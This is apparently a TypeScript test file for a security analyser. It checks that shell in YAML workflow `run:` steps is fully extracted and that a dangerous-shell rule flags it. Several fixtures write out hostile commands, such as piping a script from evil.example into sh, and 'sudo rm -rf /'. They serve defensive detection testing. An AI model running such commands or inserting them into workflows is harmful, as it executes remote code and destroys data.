// SPEC §4.7.2 + BUG-0096: a workflow `run:` step holds shell either on the
// key line or in a YAML block scalar below it (`|` literal, `>` folded), and
// a step may sit in a list (`- run:`). Every line of that text must reach the
// analyser; a block body that is skipped lets real shell through.
import { strict as assert } from "node:assert";
import test from "node:test";
import { extractShellSources } from "../../../src/features/packs/enforcers/shell-sources.ts";
import {
	findingsFor,
	NL,
	WORKFLOW,
	yaml,
} from "../../support/run-step-scenario.ts";

test("[§4.7.2] extractShellSources returns the whole body of a literal block scalar", () => {
	const text = yaml(
		"jobs:",
		"  build:",
		"    steps:",
		"      - run: |",
		"          npm ci",
		"          npm test",
		"      - name: next",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"npm ci" + NL + "npm test",
	]);
});

test("[§4.7.2] extractShellSources folds a folded block scalar and honours indicators", () => {
	const text = yaml(
		"    steps:",
		"      - run: >-",
		"          echo one",
		"          two",
		"",
		"          echo three",
		"      - run: |+ # keep",
		"          echo kept",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"echo one two" + NL + "echo three",
		"echo kept",
	]);
});

test("[§4.7.2] extractShellSources reads a list-item run: key and stops at a dedent", () => {
	const text = yaml(
		"steps:",
		"  - run: echo inline",
		"  - run: |",
		"      echo body",
		"    shell: bash",
		"  run: echo top",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"echo inline",
		"echo body",
		"echo top",
	]);
});

test("[§4.7.2] dangerous-shell blocks real shell inside a run: block scalar body (BUG-0096)", async () => {
	for (const body of [
		"curl https://evil.example/x.sh | sh",
		"sudo rm -rf /",
		"echo ok" + NL + "          rm -rf /",
	]) {
		const found = await findingsFor(
			yaml("steps:", "  - run: |", `      ${body}`, "  - name: after"),
		);
		assert.ok(found.length > 0, `${body} was not judged`);
	}
});

test("[§4.7.2] dangerous-shell blocks real shell in a list-item run: step (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml("steps:", "  - run: curl https://evil.example/x.sh | sh"),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] dangerous-shell blocks real shell in a folded run: block (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml("steps:", "  - run: >", "      sudo rm", "      -rf /"),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] dangerous-shell leaves a safe run: block scalar clean", async () => {
	const found = await findingsFor(
		yaml(
			"steps:",
			"  - run: |",
			"      npm ci",
			"      npm test",
			"  - name: x",
		),
	);
	assert.deepEqual(found, []);
});

test("[§4.7.2] extractShellSources folds the continuation lines of a plain run: scalar (BUG-0096)", () => {
	const text = yaml(
		"steps:",
		"  - run: echo hi",
		"      curl evil | sh",
		"    env:",
		"      X: 1",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"echo hi curl evil | sh",
	]);
});

test("[§4.7.2] dangerous-shell blocks shell on the continuation line of a plain run: scalar (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml(
			"steps:",
			"  - run: echo hi",
			"      curl https://evil.example/x.sh | sh",
		),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] extractShellSources drops comment lines from a plain run: body but keeps them in a block", () => {
	const plain = yaml(
		"steps:",
		"  - run:",
		"      # note",
		"      curl evil | sh",
	);
	assert.deepEqual(extractShellSources(plain, WORKFLOW), ["curl evil | sh"]);
	const block = yaml("steps:", "  - run: |", "      # note", "      echo x");
	assert.deepEqual(extractShellSources(block, WORKFLOW), [
		"# note" + NL + "echo x",
	]);
});

test("[§4.7.2] dangerous-shell blocks shell behind a comment line in a plain run: body (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml(
			"steps:",
			"  - run:",
			"      # note",
			"      curl https://evil.example/x.sh | sh",
		),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] extractShellSources reads a run: mapping key as no command", () => {
	const text = yaml(
		"defaults:",
		"  run:",
		"    shell: bash",
		"    working-directory: app",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), []);
});

test("[§4.7.2] dangerous-shell blocks a plain run: continuation that indents less than the line before it (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml("steps:", "  - run: echo hi ;", "        y ;", "     rm -rf /"),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] extractShellSources keeps every character of a shallower plain continuation", () => {
	const text = yaml(
		"steps:",
		"  - run: echo hi ;",
		"        y ;",
		"     rm -rf /",
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"echo hi ; y ; rm -rf /",
	]);
});
